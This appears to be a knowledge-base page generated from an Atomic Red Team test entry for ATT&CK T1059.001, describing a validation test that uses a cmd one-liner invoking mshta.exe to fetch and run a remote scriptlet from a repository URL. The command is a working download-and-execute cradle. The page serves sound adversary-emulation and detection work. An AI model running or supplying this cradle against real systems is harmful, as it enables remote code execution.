---
atomic_guid: "8a2ad40b-12c7-4b25-8521-2737b0a415af"
title: "Powershell invoke mshta.exe download"
framework: "atomic"
generated: "true"
attack_technique_id: "T1059.001"
attack_technique_name: "Command and Scripting Interpreter: PowerShell"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.yaml"
build_date: "2026-04-27 19:12:26"
executor: "command_prompt"
aliases:
  - "8a2ad40b-12c7-4b25-8521-2737b0a415af"
  - "Powershell invoke mshta.exe download"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[kb/lolbas/index|LOLBAS]] • [[workspaces/index|Notes]]

Powershell invoke mshta to download payload. Upon execution, a new PowerShell window will be opened which will display "Download Cradle test success!".

Provided by https://github.com/mgreen27/mgreen27.github.io

## ATT&CK Mapping

- [[kb/attack/techniques/T1059-command_and_scripting_interpreter#^t1059001-powershell|T1059.001: PowerShell]]

## Input Arguments

### url

- description: url of payload to execute
- type: url
- default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/mshta.sct

## Executor

- name: command_prompt

### Command

```cmd
C:\Windows\system32\cmd.exe /c "mshta.exe javascript:a=GetObject('script:#{url}').Exec();close()"
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1059.001/T1059.001.yaml)
